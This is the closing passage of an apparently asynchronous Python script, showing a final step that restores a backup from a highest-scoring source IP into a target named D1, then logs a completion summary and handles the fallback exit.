        # Step 4: Restore into D1
        result = await restore_to_d1(bridge, best["ip"])

        log.info("\n" + "=" * 60)
        log.info("✅ ONE-CLICK COMPLETE")
        log.info("  Source: %s (score=%d)", best["ip"], best["score"])
        log.info("  Backup: %s", BACKUP_DIR / best["ip"].replace(".", "_"))
        log.info("  Restore: %s", result.get("status", "unknown"))
        log.info("=" * 60)

    else:
        print(__doc__)
        sys.exit(1)


if __name__ == "__main__":
    asyncio.run(main())
